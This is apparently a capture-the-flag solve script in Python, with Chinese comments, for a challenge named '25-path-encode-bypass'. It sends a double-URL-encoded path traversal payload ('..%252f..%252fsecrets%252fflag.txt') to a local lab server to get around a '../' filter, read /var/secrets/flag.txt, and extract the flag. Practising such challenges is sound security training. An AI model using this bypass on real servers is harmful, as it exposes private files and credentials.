#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
"""
25-path-encode-bypass
利用双重 URL 编码绕过路径穿越过滤，读取 /var/secrets/flag.txt
"""

import re
import sys
from urllib.parse import urljoin

import requests


BASE_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:34310/")
# /var/www/public/ -> /var/ 需要退两级，然后进 secrets/flag.txt
# ../ 被过滤，所以把 / 双重编码为 %252f，服务端二次解码后变成 /
PAYLOAD = "..%252f..%252fsecrets%252fflag.txt"


def main():
    url = BASE_URL + "?file=" + PAYLOAD
    print(f"[+] Request: {url}")

    try:
        resp = requests.get(url, timeout=10)
    except requests.RequestException as e:
        print(f"[-] request failed: {e}")
        sys.exit(1)

    print(f"[+] Status: {resp.status_code}")
    print(resp.text.strip())

    m = re.search(r"TOGOGO-flag\{[^}]+\}", resp.text)
    if m:
        print(f"[+] Flag: {m.group(0)}")
    else:
        print("[-] flag not found")
        sys.exit(2)


if __name__ == "__main__":
    main()
